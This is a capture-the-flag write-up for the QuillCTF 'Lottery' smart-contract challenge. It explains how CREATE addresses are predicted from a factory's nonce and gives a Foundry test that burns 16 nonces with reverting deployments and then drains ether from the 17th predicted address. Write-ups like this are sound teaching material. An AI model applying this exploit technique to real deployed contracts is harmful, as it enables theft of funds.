## Capture the Flag Challenge `Lottery`

https://academy.quillaudits.com/challenges/quillctf-challenges/lottery

## Prerequisites

This project uses `foundry` (https://book.getfoundry.sh/) which needs to be set up.

## Running the project

Run the following commands to install dependencies:
```
forge install foundry-rs/forge-std
```

Run the following command to compile the contracts:
```
forge build
```

Run the following command to run the tests:
```
forge test
```

## Solution

The opcode `create` deploys a contract to the following address `keccak256(rlp([sender_address,sender_nonce]))[12:]`. The new address of the contract depends only on the `sender_address` (factory address in our example) and the `sender_nonce`. Investigating the first few addresses that the factory contract creates confirms that the address `0x0A1EB1b2d96a175608edEF666c171d351109d8AA` is created by the `factory` when its nonce is 17. I create a `Revert` contract to use the `type(Revert).creationCode` value as input parameter for the first 16 calls to the `factory.dep` function so that the creation of a new contract reverts in the constructor. This will refund the 10 ether to the attacker. I create a `Withdraw` contract to use the `type(Withdraw).creationCode` value as input parameter for the 17th call to the `factory.dep` function so that a smart contract is created at address `0x0A1EB1b2d96a175608edEF666c171d351109d8AA`. The `Withdraw` smart contract has a function to withdraw the ether on its balance.

```
// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import {Test} from "forge-std/Test.sol";
import "forge-std/console.sol";

contract Revert {
    constructor() {
        revert();
    }
}

contract Withdraw {
    function withdraw() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}

contract Factory {
    function dep(bytes memory _code) public payable returns (address x) {
        require(msg.value >= 10 ether);
       
        assembly {
            x := create(0, add(0x20, _code), mload(_code))
        }
        if (x == address(0)) payable(msg.sender).transfer(msg.value);
    }
}

contract Lottery is Test {
    Factory private factory;
    address attacker;

    function setUp() public {
        factory = new Factory();
        attacker = makeAddr("attacker");
    }

    receive() external payable {}

    function testLottery() public {
        vm.deal(attacker, 11 ether);
        vm.deal(0x0A1EB1b2d96a175608edEF666c171d351109d8AA, 200 ether);
        vm.startPrank(attacker);

        // Solution

        bytes memory revertByteCode = type(Revert).creationCode;

        for (int i = 0; i < 16; i++) {
            
            factory.dep{value: 10 ether}(revertByteCode);
        }

        bytes memory withdrawByteCode = type(Withdraw).creationCode;

        factory.dep{value: 10 ether}(withdrawByteCode);

        Withdraw(0x0A1EB1b2d96a175608edEF666c171d351109d8AA).withdraw();

        vm.stopPrank();
        assertGt(attacker.balance, 200 ether);
    }
}
```

